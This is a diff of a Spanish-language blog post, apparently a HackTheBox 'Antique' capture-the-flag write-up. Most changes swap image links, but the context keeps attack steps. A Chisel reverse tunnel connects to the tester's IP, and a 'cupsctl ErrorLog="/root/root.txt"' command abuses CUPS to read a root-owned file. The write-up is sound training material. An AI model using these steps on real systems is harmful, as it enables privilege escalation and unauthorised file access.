@@ -4,8 +4,10 @@ date: '2022-01-30'
 tags: ["CTF", "Hacking", "Pentesting", "#Import 2022-12-20 21:06"]
 draft: false
 authors: ['default']
-summary: Me estreno con este post donde me pongo en la piel de un pentester o Hacker que mola más y trato d
+summary: '![](/static/images/uploads/ctf-antique/Screenshot_1-1.webp)'
 ---
+
+![](/static/images/uploads/ctf-antique/Screenshot_1-1.webp)
 
 Me estreno con este post donde me pongo en la piel de un pentester o Hacker (que mola más) y trato de conseguir acceso a una de las máquinas de [HackTheBox](https://app.hackthebox.com/). Este tipo de pruebas se denominan Capture The Flag, que básicamente consiste en:
 
@@ -16,7 +18,9 @@ De este modo, introduces el flag en la plataforma y demuestras que has conseguid
 
 En cualquier caso, vamos al lío. Las fases de un trabajo de este tipo son las siguientes:
 
-![](https://blog.ikerocio.com/content/images/2022/01/fases-proyecto-pentesting-768x478.png)Si bien es cierto que no es un trabajo totalmente lineal y que en cada uno de los momentos debes continuar enumerando dispositivos, analizando vulnerabilidades nuevas que te vas encontrando... podemos resumirlo del siguiente modo:
+![](/static/images/uploads/ctf-antique/fases-proyecto-pentesting-768x478.webp)
+
+Si bien es cierto que no es un trabajo totalmente lineal y que en cada uno de los momentos debes continuar enumerando dispositivos, analizando vulnerabilidades nuevas que te vas encontrando... podemos resumirlo del siguiente modo:
 
 1. Escaneo
 2. Acceso al sistema
@@ -210,7 +214,9 @@ lp@antique:~$ ./chisel client 10.10.14.16:8000 R:631:127.0.0.1:631
 ```
 Abrimos un navegador desde nuestro sistema et voilà.
 
-![](https://blog.ikerocio.com/content/images/2022/01/Screenshot\_2.png)Lo siguiente que podemos hacer es buscar vulnerabilidades para la versión 1.6.1 de CUPS. Y nos encontramos ante la siguiente [vulnerabilidad](https://www.rapid7.com/db/modules/post/multi/escalate/cups_root_file_read/) y el siguiente [exploit](https://www.infosecmatter.com/metasploit-module-library/?mm=post/multi/escalate/cups_root_file_read). Es un post de un script de Metasploit que en principio lo vamos a utilizar para entender que hace. Generalmente, estos scripts hacen tareas muy simples y es interesante examinarlos para aprender más aún de ellos. En este caso, la vulnerabilidad se basa en un problema dentro del módulo de administraciónver archivo de registro de error en CUPS. 
+![](/static/images/uploads/ctf-antique/Screenshot\_2.webp)
+
+Lo siguiente que podemos hacer es buscar vulnerabilidades para la versión 1.6.1 de CUPS. Y nos encontramos ante la siguiente [vulnerabilidad](https://www.rapid7.com/db/modules/post/multi/escalate/cups_root_file_read/) y el siguiente [exploit](https://www.infosecmatter.com/metasploit-module-library/?mm=post/multi/escalate/cups_root_file_read). Es un post de un script de Metasploit que en principio lo vamos a utilizar para entender que hace. Generalmente, estos scripts hacen tareas muy simples y es interesante examinarlos para aprender más aún de ellos. En este caso, la vulnerabilidad se basa en un problema dentro del módulo de administraciónver archivo de registro de error en CUPS. 
 
 Este módulo imprime por pantalla la ubicación del log de error. Además, aquellos usuarios del grupo *lpadmin* son capaces de modificar dicha ubicación con el comando *cupsctl*. Comprobamos que pertenecemos a dicho grupo.
 
@@ -227,7 +233,9 @@ lp@antique:~$ cupsctl ErrorLog="/root/root.txt"
 ```
 Nos aseguramos que seguimos manteniendo el túnel de Chisel activo y vamos al navegador para revisar el módulo de error de CUPS.
 
-![](https://blog.ikerocio.com/content/images/2022/01/Screenshot\_3-1.png)Ahí está el flag de root. He tenido que recargar la página asegurándome de no cachear la respuesta, ya que al principio no era capaz de ver el resultado. Con esto finalizamos la máquina.
+![](/static/images/uploads/ctf-antique/Screenshot\_3-1.webp)
+
+Ahí está el flag de root. He tenido que recargar la página asegurándome de no cachear la respuesta, ya que al principio no era capaz de ver el resultado. Con esto finalizamos la máquina.
 
 Conclusión
 ----------
